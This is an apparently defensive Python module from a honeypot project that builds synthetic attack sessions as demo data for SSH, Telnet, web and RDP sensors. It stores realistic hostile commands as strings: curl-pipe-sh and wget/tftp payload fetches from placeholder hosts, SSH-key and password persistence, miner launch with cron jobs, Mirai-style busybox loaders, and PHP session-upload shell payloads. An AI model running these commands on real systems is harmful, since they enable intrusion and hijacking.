"""Per-sensor attack scripts.

A *plan* is the whole life of one connection expressed as time offsets. The generator later
pins it to a start time. Nothing here talks to a network or executes anything: every command is
just a string in an event.
"""

from __future__ import annotations

import base64
import hashlib
import random
from collections.abc import Sequence
from dataclasses import dataclass, field
from typing import Any

from suckerpot_common import EventType, SensorName, truncate_data

from demo import data as D
from demo.ips import random_public_ip, random_src_port

Gap = tuple[float, float]


@dataclass(frozen=True)
class Step:
    offset: float
    type: EventType
    data: dict[str, Any]


@dataclass
class Plan:
    sensor: SensorName
    src_ip: str
    src_port: int
    dst_port: int
    steps: list[Step] = field(default_factory=list)

    @property
    def duration(self) -> float:
        return self.steps[-1].offset if self.steps else 0.0


def pick[T](rng: random.Random, items: Sequence[tuple[T, float]]) -> T:
    return rng.choices([i[0] for i in items], [i[1] for i in items])[0]


class Builder:
    """Accumulates steps while keeping a running clock."""

    def __init__(self, rng: random.Random, plan: Plan) -> None:
        self.rng = rng
        self.plan = plan
        self.t = 0.0

    def add(self, etype: EventType, data: dict[str, Any], gap: Gap = (0.05, 0.8)) -> None:
        self.t += self.rng.uniform(*gap)
        self.plan.steps.append(Step(round(self.t, 3), etype, truncate_data(data)))

    def connect(self, data: dict[str, Any] | None = None) -> None:
        self.add(EventType.connect, data or {}, (0.0, 0.0))

    def login(
        self, user: str, pw: str | None, ok: bool, method: str = "password", gap: Gap = (0.3, 2.0)
    ) -> None:
        d: dict[str, Any] = {"username": user, "success": ok, "method": method}
        if pw is not None:
            d["password"] = pw
        self.add(EventType.login_attempt, d, gap)

    def cmd(
        self,
        text: str,
        out: str | None = None,
        *,
        dl: tuple[str, str] | None = None,
        gap: Gap = (0.2, 3.0),
    ) -> None:
        d: dict[str, Any] = {"input": text}
        if out:
            d["output_preview"] = out
        self.add(EventType.command, d, gap)
        if dl:
            tool, url = dl
            data: dict[str, Any] = {"url": url, "tool": tool, "command": text}
            digest = campaign_sha256(url)
            if digest is not None and self.rng.random() < 0.5:
                data["sha256"] = digest
            self.add(EventType.download_attempt, data, (0.01, 0.25))

    def finish(
        self, reason: str, gap: Gap = (0.1, 1.5), extra: dict[str, Any] | None = None
    ) -> Plan:
        self.t += self.rng.uniform(*gap)
        self.plan.steps.append(
            Step(
                round(self.t, 3),
                EventType.disconnect,
                {"duration_s": round(self.t, 2), "reason": reason, **(extra or {})},
            )
        )
        return self.plan


# ---------------------------------------------------------------- shared helpers


# A few "infrastructure" hosts shared by many sources, so the Infrastructure page has a story.
# Documentation addresses and example domains only: a real stack drops them while extracting
# indicators unless INDICATORS_KEEP_DOCUMENTATION=true (see docs/demo-data.md).
CAMPAIGN_HOSTS = (
    "203.0.113.66", "203.0.113.66", "dl.example.net", "dl.example.net", "198.51.100.77",
    "cdn.example.org",
)  # fmt: skip
CAMPAIGN_SHARE = 0.4


def campaign_sha256(url: str) -> str | None:
    """A synthetic, stable sha256 for payloads served by a campaign host (never a real file)."""
    host = url.split("://", 1)[-1].split("/", 1)[0].split(":")[0]
    if host not in CAMPAIGN_HOSTS:
        return None
    return hashlib.sha256(f"suckerpot-demo:{url}".encode()).hexdigest()


def synthetic_host(rng: random.Random) -> str:
    """A throwaway malware host that can never be real: a shared campaign host, a documentation
    address or a made-up name under a reserved TLD (``.example``, ``.test``)."""
    if rng.random() < CAMPAIGN_SHARE:
        return rng.choice(CAMPAIGN_HOSTS)
    if rng.random() < 0.3:
        return f"{rng.choice(('192.0.2.', '198.51.100.', '203.0.113.'))}{rng.randint(1, 254)}"
    name = "".join(rng.choice(D.SYLLABLES) for _ in range(rng.randint(3, 5)))
    prefix = rng.choice(["", "", "cdn.", "dl.", "files."])
    return f"{prefix}{name}.{rng.choice(('example', 'test'))}"


def _rand_alnum(rng: random.Random, n: int, alphabet: str) -> str:
    return "".join(rng.choices(alphabet, k=n))


def _fake_pubkey(rng: random.Random) -> str:
    blob = base64.b64encode(rng.randbytes(270)).decode().rstrip("=")
    return "AAAAB3NzaC1yc2EAAAADAQABAAABAQ" + blob[:340]


def _wallet(rng: random.Random) -> str:
    return "4" + _rand_alnum(rng, 94, "0123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz")


def _head_index(rng: random.Random, n: int, scale: float) -> int:
    return min(int(rng.expovariate(1 / scale)), n - 1)


def _new_plan(rng: random.Random, sensor: SensorName, ip: str, dst_port: int) -> Plan:
    return Plan(sensor, ip, random_src_port(rng), dst_port)


# ---------------------------------------------------------------- SSH


def _ssh_fail_cred(rng: random.Random) -> tuple[str, str]:
    if rng.random() < 0.6:
        return D.SSH_CREDS[_head_index(rng, len(D.SSH_CREDS), 7)]
    return rng.choice(D.SSH_EXTRA_USERS), rng.choice(D.SSH_EXTRA_PASSWORDS)


def _ssh_failures(b: Builder, n: int) -> None:
    rng = b.rng
    gap: Gap = (0.25, 1.4) if rng.random() < 0.7 else (1.0, 4.0)
    for _ in range(n):
        user, pw = _ssh_fail_cred(rng)
        r = rng.random()
        if r < 0.03:
            b.login(user, None, False, "publickey", gap)
        elif r < 0.10:
            b.login(user, pw, False, "keyboard-interactive", gap)
        else:
            b.login(user, pw, False, "password", gap)


def _ssh_success(b: Builder) -> None:
    user, pw = b.rng.choice(D.SSH_CREDS[:12])
    b.login(user, pw, True, "password", (0.3, 1.5))


def _ssh_recon(b: Builder, lo: int = 3, hi: int = 7) -> None:
    for c in b.rng.sample(D.RECON_COMMANDS, b.rng.randint(lo, hi)):
        b.cmd(c, D.SSH_CANNED.get(c), gap=(0.15, 1.8))


def _ssh_persistence(b: Builder) -> None:
    key = _fake_pubkey(b.rng)
    b.cmd(
        f'cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa {key} root@build" '
        ">> .ssh/authorized_keys && chmod -R go= ~/.ssh",
        gap=(0.3, 2.0),
    )
    if b.rng.random() < 0.5:
        pw = _rand_alnum(
            b.rng, 12, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        )
        b.cmd(f'echo "root:{pw}" | chpasswd', gap=(0.3, 1.5))


def _ssh_miner(b: Builder) -> None:
    rng = b.rng
    host = synthetic_host(rng)
    url = f"http://{host}{rng.choice(D.MALWARE_PATHS)}"
    pool = f"stratum+tcp://pool.{synthetic_host(rng)}:3333"
    if rng.random() < 0.5:
        b.cmd("cd /tmp || cd /var/tmp || cd /dev/shm", gap=(0.3, 1.5))
        b.cmd(f"wget {url} -O .x", dl=("wget", url))
        b.cmd("chmod +x .x")
    else:
        sh_url = f"http://{host}/setup.sh"
        b.cmd(f"curl -s {sh_url} | sh", dl=("curl", sh_url), gap=(0.4, 2.0))
    b.cmd(
        f"nohup ./.x -o {pool} -u {_wallet(rng)} -p x --donate-level 1 >/dev/null 2>&1 &",
        gap=(0.3, 1.5),
    )
    if rng.random() < 0.6:
        b.cmd("pkill -f kinsing; pkill -f kdevtmpfsi", gap=(0.3, 1.5))
    if rng.random() < 0.5:
        b.cmd("crontab -l | { cat; echo '*/15 * * * * /tmp/.x'; } | crontab -", gap=(0.3, 1.5))


def _loader_commands(b: Builder, prefix: str = "") -> None:
    rng = b.rng
    host = synthetic_host(rng)
    sh = f"http://{host}/bins.sh"
    b.cmd(
        f"{prefix}cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget {sh}; "
        "chmod 777 bins.sh; sh bins.sh; rm -rf bins.sh",
        dl=("wget", sh),
        gap=(0.3, 1.5),
    )
    if rng.random() < 0.6:
        binary = rng.choice(D.MIRAI_BINS)
        b.cmd(
            f"tftp -g -l {binary} -r {binary} {host}; chmod 777 {binary}; ./{binary} ssh",
            dl=("tftp", f"tftp://{host}/{binary}"),
            gap=(0.3, 1.5),
        )


def build_ssh(rng: random.Random, ip: str) -> Plan:
    plan = _new_plan(rng, SensorName.ssh, ip, 22)
    b = Builder(rng, plan)
    b.connect({"client_version": rng.choice(D.SSH_CLIENTS)})
    kind = pick(
        rng,
        [
            ("scan", 18),
            ("brute", 38),
            ("recon", 12),
            ("miner", 11),
            ("persist", 8),
            ("loader", 5),
            ("human", 3),
            ("idle", 5),
        ],
    )
    reason = "client disconnected"
    if kind == "scan":
        b.t += rng.uniform(0.2, 2.5)
        reason = rng.choice(["client disconnected", "protocol mismatch", "connection lost"])
    elif kind == "brute":
        n = 1 + min(int(rng.expovariate(1 / 7)), 44)
        _ssh_failures(b, n)
        reason = "too many authentication failures" if n >= 6 else "client disconnected"
    else:
        _ssh_failures(b, min(int(rng.expovariate(1 / 3)), 12))
        _ssh_success(b)
        if kind == "recon":
            _ssh_recon(b)
        elif kind == "miner":
            _ssh_recon(b, 1, 3)
            _ssh_miner(b)
        elif kind == "persist":
            _ssh_persistence(b)
            _ssh_recon(b, 1, 3)
        elif kind == "loader":
            _loader_commands(b)
        elif kind == "human":
            cmds = rng.sample(D.HUMAN_COMMANDS[:-1], rng.randint(4, 9))
            for c in cmds:
                b.cmd(c, D.SSH_CANNED.get(c), gap=(2.0, 15.0))
            if rng.random() < 0.7:
                b.cmd("exit", gap=(1.0, 6.0))
        else:  # idle: logs in, then does nothing
            b.t += rng.uniform(3, 40)
            reason = "timeout"
    return b.finish(reason)


# ---------------------------------------------------------------- Telnet


# Loader variants reuse the same probe word, like real botnet families do. That is what lets the
# Campaigns page group the demo sessions: same script from many sources.
_TOKENS = ("ECCHI", "MIRAI", "KOMODO", "OWARI")


def _token(rng: random.Random) -> str:
    if rng.random() < 0.85:
        return rng.choices(_TOKENS, (5, 3, 2, 2))[0]
    return _rand_alnum(rng, rng.randint(4, 6), "ABCDEFGHIJKLMNOPQRSTUVWXYZ")


def build_telnet(rng: random.Random, ip: str, *, wave: bool = False) -> Plan:
    plan = _new_plan(rng, SensorName.telnet, ip, 23)
    b = Builder(rng, plan)
    b.connect()
    kind = (
        pick(rng, [("mirai", 80), ("brute", 12), ("scan", 8)])
        if wave
        else pick(rng, [("mirai", 45), ("brute", 28), ("scan", 15), ("recon", 12)])
    )
    reason = "client disconnected"
    if kind == "scan":
        b.t += rng.uniform(0.2, 3.0)
        return b.finish(reason)
    fails = rng.randint(0, 6) if kind != "brute" else rng.randint(2, 20)
    gap: Gap = (0.2, 1.2)
    for _ in range(fails):
        u, p = D.TELNET_CREDS[_head_index(rng, len(D.TELNET_CREDS), 6)]
        b.login(u, p, False, gap=gap)
    if kind == "brute":
        return b.finish("too many authentication failures")
    u, p = rng.choice(D.TELNET_CREDS[:10])
    b.login(u, p, True, gap=gap)
    tok = _token(rng)
    shell = [
        ("enable", "-"),
        ("system", "-"),
        ("shell", "-"),
        ("sh", None),
        (f"/bin/busybox {tok}", f"{tok}: applet not found"),
    ]
    for text, out in shell:
        b.cmd(text, out, gap=(0.1, 0.9))
    if kind == "recon":
        b.cmd("cat /proc/mounts", "rootfs / rootfs rw 0 0", gap=(0.2, 1.0))
        b.cmd("/bin/busybox cat /bin/echo", "ELF", gap=(0.2, 1.0))
        return b.finish(reason)
    host = synthetic_host(rng)
    binary = rng.choice(D.MIRAI_BINS)
    b.cmd("cat /proc/mounts; /bin/busybox " + tok, f"{tok}: applet not found", gap=(0.1, 0.8))
    if rng.random() < 0.75:
        url = f"http://{host}/bins/{binary}"
        b.cmd(
            f"cd /tmp; /bin/busybox wget {url} -O - > dvrHelper; chmod 777 dvrHelper; "
            f"./dvrHelper telnet.{binary.split('.')[-1]}",
            dl=("wget", url),
            gap=(0.2, 1.0),
        )
    if rng.random() < 0.5:
        b.cmd(
            f"/bin/busybox tftp -g -l dvrHelper -r {binary} {host}",
            dl=("tftp", f"tftp://{host}/{binary}"),
            gap=(0.2, 1.0),
        )
    b.cmd("rm -rf /tmp/*; /bin/busybox " + tok, f"{tok}: applet not found", gap=(0.2, 1.0))
    return b.finish(reason)


# ---------------------------------------------------------------- Web


def _http_status(rng: random.Random, method: str, path: str) -> int:
    if path in ("/", "/phpinfo.php", "/info.php", "/wp-login.php"):
        return 200
    if path.startswith(("/phpmyadmin", "/phpMyAdmin", "/pma", "/wp-admin")):
        return pick(rng, [(200, 40), (404, 40), (302, 20)])
    if path == "/xmlrpc.php":
        return 405 if method == "GET" else 200
    if path in ("/cgi-bin/", "/server-status", "/.htpasswd"):
        return 403
    if path.startswith("/.") or path.endswith((".bak", ".sql", ".zip")):
        return pick(rng, [(404, 90), (403, 10)])
    if path in ("/admin/", "/login"):
        return pick(rng, [(401, 40), (302, 30), (404, 30)])
    return pick(rng, [(404, 60), (403, 10), (200, 15), (301, 6), (400, 5), (405, 4)])


class _Web:
    def __init__(self, rng: random.Random, b: Builder, host_hdr: str, ua: str, tls: bool) -> None:
        self.rng, self.b, self.host_hdr, self.ua, self.tls = rng, b, host_hdr, ua, tls

    def req(
        self,
        method: str,
        path: str,
        query: str = "",
        body: str = "",
        *,
        status: int | None = None,
        headers: dict[str, str] | None = None,
        ua: str | None = None,
        gap: Gap = (0.05, 1.2),
        dl: tuple[str, str] | None = None,
        flags: list[str] | None = None,
    ) -> None:
        agent = ua or self.ua
        hdrs = {"Host": self.host_hdr, "User-Agent": agent, "Accept": "*/*"}
        if method == "POST" and "Content-Type" not in (headers or {}):
            hdrs["Content-Type"] = "application/x-www-form-urlencoded"
        if method == "POST":
            hdrs["Content-Length"] = str(len(body))
        hdrs["Connection"] = "close"
        hdrs.update(headers or {})
        self.b.add(
            EventType.http_request,
            {
                "method": method,
                "path": path,
                "query": query,
                "headers": hdrs,
                "user_agent": agent,
                "body_preview": body,
                "status": status if status is not None else _http_status(self.rng, method, path),
                **({"flags": flags} if flags else {}),
            },
            gap,
        )
        if dl:
            self.b.add(
                EventType.download_attempt,
                {"url": dl[1], "tool": dl[0], "command": f"{method} {path}"},
                (0.01, 0.2),
            )


def _web_ua(rng: random.Random, browser_p: float = 0.15) -> str:
    if rng.random() < browser_p:
        return rng.choice(D.WEB_USER_AGENTS_BROWSERS)
    return pick(rng, [(u, float(w)) for u, w in D.WEB_USER_AGENTS_SCANNERS])


def _php2shell(w: _Web) -> None:
    rng = w.rng
    path = rng.choice(D.PHP2SHELL_PATHS)
    sid = _rand_alnum(rng, 26, "abcdefghijklmnopqrstuvwxyz0123456789")
    boundary = "----WebKitFormBoundary" + _rand_alnum(
        rng, 16, "abcdefghijklmnopqrstuvwxyz0123456789"
    )
    marker = _rand_alnum(rng, 8, "abcdefghijklmnopqrstuvwxyz")
    host = synthetic_host(rng)
    shell_url = f"http://{host}/s.txt"
    payloads: list[tuple[str, tuple[str, str] | None]] = [
        (f'<?php echo md5("{marker}"); ?>', None),
        ("<?php phpinfo(); ?>", None),
        ('<?php system("id"); ?>', None),
        (f'<?php system("wget {shell_url} -O .s.php"); ?>', ("wget", shell_url)),
    ]
    weights = [45, 15, 20, 20]
    if rng.random() < 0.4:  # a pre-flight GET to see if the site is alive
        w.req("GET", path, status=200, gap=(0.05, 0.6))
    for _ in range(rng.randint(2, 5)):
        payload, dl = rng.choices(payloads, weights)[0]
        body = (
            f"--{boundary}\r\n"
            'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
            f"{payload}\r\n"
            f"--{boundary}\r\n"
            'Content-Disposition: form-data; name="file"; filename="a.txt"\r\n'
            "Content-Type: text/plain\r\n\r\n"
            f"{'A' * rng.randint(64, 512)}\r\n"
            f"--{boundary}--\r\n"
        )
        w.req(
            "POST",
            path,
            body=body,
            status=200,
            headers={
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                "Cookie": f"PHPSESSID={sid}",
            },
            gap=(0.02, 0.4),
            dl=dl,
            # What the web sensor sets for the exploit shape: the field carrying PHP code.
            flags=["upload_progress", "php_code", "php2shell"],
        )
    if rng.random() < 0.6:
        w.req(
            "GET",
            path,
            query=f"page=../../../../tmp/sess_{sid}",
            status=200,
            headers={"Cookie": f"PHPSESSID={sid}"},
            gap=(0.1, 0.8),
            flags=["lfi", "session_include", "session_ref_match", "php2shell"],
        )


def _wordpress(w: _Web) -> None:
    rng = w.rng
    w.req("GET", "/wp-login.php", gap=(0.1, 0.6))
    for _ in range(rng.randint(1, 6)):
        user = rng.choice(D.WP_USERS)
        pw = rng.choice([*D.SSH_EXTRA_PASSWORDS, "admin", "wordpress", "password1"])
        w.req(
            "POST",
            "/wp-login.php",
            body=f"log={user}&pwd={pw}&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1",
            status=200,
            gap=(0.3, 1.6),
        )
    if rng.random() < 0.5:
        w.req(
            "POST",
            "/xmlrpc.php",
            body='<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName>'
            "<params></params></methodCall>",
            headers={"Content-Type": "text/xml"},
            gap=(0.2, 1.0),
        )
    for p in rng.sample(D.WP_PATHS[2:], rng.randint(0, 3)):
        w.req("GET", p)


def build_web(rng: random.Random, ip: str, *, php2shell_p: float = 0.0) -> Plan:
    tls = rng.random() < 0.3
    plan = _new_plan(rng, SensorName.web, ip, 443 if tls else 80)
    b = Builder(rng, plan)
    b.connect({"tls": tls})
    host_hdr = D.FAKE_HOSTNAME if rng.random() < 0.3 else random_public_ip(rng)
    kind = (
        "php2shell"
        if rng.random() < php2shell_p
        else pick(
            rng,
            [
                ("single", 22),
                ("recon", 22),
                ("env", 12),
                ("wordpress", 12),
                ("pma", 8),
                ("probe", 14),
                ("shellshock", 3),
                ("browser", 7),
            ],
        )
    )
    if kind == "php2shell":
        ua = rng.choice(
            [
                "python-requests/2.32.3",
                "curl/8.5.0",
                "Go-http-client/1.1",
                *D.WEB_USER_AGENTS_BROWSERS[:2],
            ]
        )
    elif kind == "browser":
        ua = rng.choice(D.WEB_USER_AGENTS_BROWSERS)
    else:
        ua = _web_ua(rng)
    w = _Web(rng, b, host_hdr, ua, tls)
    if kind == "php2shell":
        _php2shell(w)
    elif kind == "single":
        w.req("GET", "/", status=200, gap=(0.1, 1.0))
    elif kind == "recon":
        for _ in range(rng.randint(2, 7)):
            path, query, _w = pick(rng, [(p, float(p[2])) for p in D.WEB_RECON_PATHS])
            w.req("GET", path, query)
    elif kind == "env":
        for p in rng.sample(D.ENV_SCAN_PATHS, rng.randint(4, len(D.ENV_SCAN_PATHS))):
            w.req("GET", p, gap=(0.03, 0.4))
    elif kind == "wordpress":
        _wordpress(w)
    elif kind == "pma":
        for p in rng.sample(D.PMA_PATHS, rng.randint(2, len(D.PMA_PATHS))):
            w.req("GET", p, gap=(0.05, 0.6))
    elif kind == "probe":
        for method, path, query, body in rng.sample(D.WEB_EXPLOIT_PROBES, rng.randint(1, 3)):
            w.req(method, path, query, body, status=pick(rng, [(404, 70), (200, 15), (403, 15)]))
    elif kind == "shellshock":
        w.req("GET", "/cgi-bin/status", ua=D.SHELLSHOCK_UA, status=403)
        w.req("GET", "/cgi-bin/test.cgi", ua=D.SHELLSHOCK_UA, status=404)
    else:  # browser
        w.req("GET", "/", status=200, gap=(0.2, 2.0))
        w.req("GET", "/favicon.ico", status=404, gap=(0.1, 0.8))
        if rng.random() < 0.5:
            w.req("GET", "/admin/", gap=(2.0, 15.0))
    return b.finish(rng.choice(["client disconnected", "keep-alive timeout", "connection closed"]))


# ---------------------------------------------------------------- RDP


def _x224_request(user: str | None) -> bytes:
    cookie = f"Cookie: mstshash={user}\r\n".encode() if user else b""
    neg = bytes([0x01, 0x00, 0x08, 0x00, 0x03, 0x00, 0x00, 0x00])
    tpdu = bytes([0xE0, 0, 0, 0, 0, 0]) + cookie + neg
    li = len(tpdu)
    total = 4 + 1 + li
    return bytes([0x03, 0x00, total >> 8, total & 0xFF, li]) + tpdu


def _other_probe(rng: random.Random) -> bytes:
    return rng.choice(
        [
            b"GET / HTTP/1.1\r\nHost: x\r\n\r\n",
            bytes.fromhex("1603010200010001fc0303") + rng.randbytes(24),
            b"\x00\x00\x00\x00" + rng.randbytes(12),
            b"SSH-2.0-libssh_0.9.6\r\n",
        ]
    )


RDP_TOOLS = [("FreeRDP", 50), ("unknown", 20), ("rdesktop", 10), ("mstsc", 10), ("nmap", 10)]
RDP_DOMAINS = ["WORKGROUP", "OFFICE", "CORP", "SRV-WIN01", ""]
RDP_DECOY = [("administrator", "P@ssw0rd"), ("admin", "Password1"), ("user", "123456")]


def _ntlm_login(
    b: Builder, tool: str, user: str, domain: str, weak: str | None = None, anonymous: bool = False
) -> None:
    rng = b.rng
    data: dict[str, Any] = {
        "username": "" if anonymous else user,
        "password": weak,
        "success": weak is not None,
        "method": "rdp-ntlm",
        "client_tool": tool,
        "domain": domain,
        "workstation": rng.choice(["WIN-" + rng.randbytes(3).hex().upper(), "DESKTOP-1A2B3C"]),
        "ntlm_version": rng.choice(["v2", "v2", "v1"]),
        "nt_response_len": 0 if anonymous else rng.choice([24, 142]),
        "nt_response_preview": "" if anonymous else rng.randbytes(8).hex(),
        "anonymous": anonymous,
    }
    b.add(EventType.login_attempt, data, (0.4, 2.5))


def _rdp_ntlm(rng: random.Random, b: Builder, kind: str) -> tuple[str, dict[str, Any]]:
    tool = pick(rng, RDP_TOOLS)
    domain = rng.choice(RDP_DOMAINS)
    flags = ["rdp_ntlm"]
    b.add(EventType.scan, {"payload_preview": _x224_request(None).hex()}, (0.05, 0.5))
    if kind == "ntlm_brute":
        for u in rng.sample(D.RDP_USERS, rng.randint(6, 12)):
            _ntlm_login(b, tool, u, domain)
    elif kind == "ntlm_weak":
        for u in rng.sample(D.RDP_USERS, rng.randint(1, 3)):
            _ntlm_login(b, tool, u, domain)
        user, pw = rng.choice(RDP_DECOY)
        _ntlm_login(b, tool, user, domain, weak=pw)
        flags.append("weak_password_match")
    elif kind == "ntlm_null":
        _ntlm_login(b, tool, "", domain, anonymous=True)
        flags.append("null_session")
    else:
        _ntlm_login(b, tool, rng.choice(D.RDP_USERS), domain)
        if kind == "bluekeep":
            flags.append("bluekeep_probe")
    return tool, {"flags": flags, "client_tool": tool, "stage": "credssp"}


def build_rdp(rng: random.Random, ip: str) -> Plan:
    plan = _new_plan(rng, SensorName.rdp, ip, 3389)
    b = Builder(rng, plan)
    b.connect()
    kind = pick(
        rng,
        [
            ("scan", 24),
            ("cookie", 28),
            ("brute", 10),
            ("other", 8),
            ("ntlm", 8),
            ("ntlm_brute", 9),
            ("ntlm_weak", 4),
            ("ntlm_null", 2),
            ("bluekeep", 3),
            ("nla_off", 4),
        ],
    )
    reason = "client disconnected"
    extra: dict[str, Any] | None = None
    if kind == "scan":
        b.add(EventType.scan, {"payload_preview": _x224_request(None).hex()}, (0.05, 0.5))
        b.t += rng.uniform(0.1, 2.0)
    elif kind == "cookie":
        user = rng.choice(D.RDP_USERS)
        b.add(EventType.scan, {"payload_preview": _x224_request(user).hex()[:128]}, (0.05, 0.5))
        b.add(
            EventType.login_attempt,
            {"username": user, "success": False, "method": "rdp-cookie"},
            (0.1, 1.5),
        )
        b.t += rng.uniform(0.2, 4.0)
    elif kind == "brute":
        users = rng.sample(D.RDP_USERS, rng.randint(3, 8))
        b.add(EventType.scan, {"payload_preview": _x224_request(users[0]).hex()[:128]}, (0.05, 0.5))
        for u in users:
            b.add(
                EventType.login_attempt,
                {"username": u, "success": False, "method": "rdp-cookie"},
                (0.8, 4.0),
            )
        reason = "too many authentication failures"
    elif kind == "nla_off":
        tool = rng.choice(["rdesktop", "unknown"])
        b.add(EventType.scan, {"payload_preview": _x224_request(None).hex()}, (0.05, 0.5))
        user = rng.choice(D.RDP_USERS)
        b.add(
            EventType.login_attempt,
            {
                "username": user,
                "password": rng.choice(D.SSH_EXTRA_PASSWORDS),
                "success": False,
                "method": "rdp-nla-off",
                "client_tool": tool,
                "domain": "",
            },
            (0.4, 2.0),
        )
        extra = {"flags": ["rdp_nla_off"], "client_tool": tool, "stage": "client_info"}
        reason = "client_info_captured"
    elif kind.startswith("ntlm") or kind == "bluekeep":
        _, extra = _rdp_ntlm(rng, b, kind)
        reason = "credssp_logon_failure"
    else:
        b.add(EventType.scan, {"payload_preview": _other_probe(rng).hex()[:128]}, (0.05, 0.5))
        reason = "protocol mismatch"
    return b.finish(reason, extra=extra)
